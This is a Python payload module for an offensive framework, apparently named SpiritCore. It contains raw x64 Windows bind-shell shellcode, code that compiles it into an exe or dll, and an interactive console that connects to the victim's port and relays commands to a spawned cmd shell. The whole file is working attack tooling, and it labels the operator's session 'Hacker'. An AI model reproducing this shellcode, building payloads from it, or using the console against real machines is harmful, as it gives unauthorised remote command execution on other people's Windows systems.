# -*- coding: UTF-8 -*-
import genericpath
from SpiritCore.Payload import *
from SpiritCore.FCmd import *
from SpiritCore.Lib.Socket import *
from SpiritCore.Lib.Build import *
from SpiritCore.Lib.Payload import *
from shutil import copyfile
import socket
from struct import pack
class Payloads(Payload):
    Info = {
        "Name": "Windows Exec ",
        "Author": "ZSD",
        "Description": "Test",
        "Options": (
            ("TargetIp", "192.168.0.108", True, 'Command'),
            ("Port", "4444", True, 'Port'),
        )
    }
    Support=True
    OS=1
    Size=0
    supportfile=["dll","exe"]
    Type="Shell"
    Types="Shell"
    def Generate(self):
        buf =  b""
        buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
        buf += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
        buf += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
        buf += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
        buf += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
        buf += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
        buf += b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
        buf += b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
        buf += b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
        buf += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
        buf += b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
        buf += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
        buf += b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        buf += b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        buf += b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32"
        buf += b"\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec"
        buf += b"\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00"+pack(">H", int(self.Parameate['Port']))
        buf += b"\x00\x00\x00\x00\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41"
        buf += b"\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01"
        buf += b"\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50"
        buf += b"\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48"
        buf += b"\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"
        buf += b"\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9"
        buf += b"\x41\xba\xc2\xdb\x37\x67\xff\xd5\x48\x31\xd2\x48\x89"
        buf += b"\xf9\x41\xba\xb7\xe9\x38\xff\xff\xd5\x4d\x31\xc0\x48"
        buf += b"\x31\xd2\x48\x89\xf9\x41\xba\x74\xec\x3b\xe1\xff\xd5"
        buf += b"\x48\x89\xf9\x48\x89\xc7\x41\xba\x75\x6e\x4d\x61\xff"
        buf += b"\xd5\x48\x81\xc4\xa0\x02\x00\x00\x49\xb8\x63\x6d\x64"
        buf += b"\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
        buf += b"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66"
        buf += b"\xc7\x44\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00"
        buf += b"\x68\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49"
        buf += b"\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89\xc1"
        buf += b"\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2\x48\xff"
        buf += b"\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff\xd5\xbb\xe0"
        buf += b"\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83"
        buf += b"\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
        buf += b"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
        #@write("s")
        #write("s")

        #ShellCode=str(buf)
        self.Size=len(buf)
        return buf
    def GenerateFile(self):
        Object = CMAKE()
        RunSCOBJECT = RunShellCodePayload(self)
        RunSCOBJECT.ShellCode=self.Generate()
        RunSCOBJECT.RunType=self.Type
        RunSCOBJECT.Encode="None"
        RunSCOBJECT.init()
        print_msg("Generate Lenght:%d"%len(RunSCOBJECT.ShellCode))
        Object.SourceCode=RunSCOBJECT.Generate()
        Filename=Object.Generate()
        if(Filename==""):
            print("Generate Error.....")
        else:
            print("Generate:%s"%self.File)
            copyfile(Filename,self.File)







    def SessionInfo(self):
        return "%s:%s  <----- Hacker"%(self.Parameate['TargetIp'],self.Parameate['Port'])
    def Console(self,SessionSocket):
        if SessionSocket==None:
            self.ShellObject=Bind_Shell()
            Obj =self.ShellObject.Connect(self.Parameate["TargetIp"],int(self.Parameate['Port']))
            self.ShellObject.Console()
            return Obj
        else:
            self.ShellObject = Bind_Shell()
            Obj = self.ShellObject.Socket=SessionSocket
            self.ShellObject.Console(One=1)
            return Obj
import threading
class RecvClass (threading.Thread):
    def __init__(self, threadID, name, SocketObject):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.SocketObject = SocketObject
    def run(self):
        while True:
            try:
                Text=self.SocketObject.Recv(4096*4096)
                write(Text)
            except Exception as error:
                #write(error)
                #write("Warrior")
                break


class Bind_Shell(Cmd):
    SystemVersion = 0
    Socket=None
    Session=None
    Object=0
    prompt="Cmd#"
    SessionConsoleSt=False
    Text = ""
    Bind=True
    def __init__(self):
        Cmd.__init__(self)
    def Connect(self,TargetIp,Port):
        self.Socket=Socket(TargetIp,Port)
        self.Socket.Connect()
        #self.Console()
        return self.Socket
    def Console(self,One=0):
        stop = None

        #write(self.Socket.Recv())
        #write(self.Socket.Recv())
        #write("sss")
        #write(str(self.Socket.recv(4096 * 4096), encoding="gbk"))
        while not stop:
            line = ""
            try:
                #self.Socket.send("dir C:/".encode('gbk'))

                if One==1:
                    self.Socket.Send("cmd"+"\n")

                RecvObject = RecvClass("", "", self.Socket)
                RecvObject.start()
                RecvObject.join()
                while True:
                    
                    
                    
                    data = ""
                    try:
                        command = str(input())
                        command += '\n'
                    except:
                        return
                    self.Socket.Send(command)
                    RecvObject=RecvClass("","",self.Socket)
                    RecvObject.setDaemon(True)
                    RecvObject.start()
                    RecvObject.join()
                    #while True:
                        #data_tmp =self.Socket.Recv(4096)
                        #data += data_tmp
                        #if len(data_tmp) < 4096:
                        #    write(data)
                        #    break
                    
                    
            except Exception as error:
                write(error)
                return




#Da.Console()













